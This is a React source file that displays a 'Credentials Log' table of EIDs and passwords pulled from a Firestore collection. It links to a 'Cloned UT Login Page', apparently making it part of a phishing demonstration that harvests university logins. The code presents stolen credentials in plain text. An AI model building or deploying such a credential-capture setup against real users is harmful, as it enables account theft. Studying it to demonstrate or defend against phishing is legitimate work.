import React, { Component } from 'react';
import { Link } from 'react-router-dom';
import firebase from '../firebase';
import {
  Container,
  Grid,
  Paper,
  Table,
  TableHead,
  TableRow,
  TableBody,
  TableCell,
  Button
} from '@material-ui/core';

export default class Log extends Component {
  constructor(props) {
    super(props);
    this.state = { credentials: [] };
  }

  componentDidMount() {
    firebase
      .firestore()
      .collection('users')
      .get()
      .then(snapshot => {
        const data = snapshot.docs.map(doc => doc.data());
        this.setState({ credentials: data });
      })
      .catch(err => console.log(err));
  }

  render() {
    return (
      <Container>
        <h1>Credentials Log:</h1>
        <Grid item xs={6}>
          <Paper>
            <Table>
              <TableHead>
                <TableRow>
                  <TableCell>EID</TableCell>
                  <TableCell>Password</TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {this.state.credentials.map((c, i) => (
                  <TableRow key={i}>
                    <TableCell>{c.eid}</TableCell>
                    <TableCell>{c.password}</TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </Paper>
        </Grid>
        <Button
          component={Link}
          to='/'
          variant='contained'
          color='secondary'
          style={{ marginTop: 15, color: 'white', marginRight: 15 }}
        >
          Cloned UT Login Page
        </Button>
        <Button
          component={Link}
          to='/about'
          variant='contained'
          color='primary'
          style={{ marginTop: 15, color: 'white', marginRight: 15 }}
        >
          Learn how it works...
        </Button>
        <Button
          component='a'
          href='https://www.github.com/ramonfabrega/dnsmasq'
          variant='contained'
          color='primary'
          style={{ marginTop: 15, color: 'white' }}
        >
          Github repository
        </Button>
      </Container>
    );

    // return (
    //   <Container>
    //     <h1>Credentials Log:</h1>
    //     <table>
    //       <thead>
    //         <th>EID</th>
    //         <th>Password</th>
    //       </thead>
    //       <tbody>
    //         {this.state.credentials.map((c, i) => (
    //           <tr key={i}>
    //             <td>{c.eid}</td>
    //             <td>{c.password}</td>
    //           </tr>
    //         ))}
    //       </tbody>
    //     </table>
    //     <p>Log Page</p>
    //   </Container>
    // );
  }
}
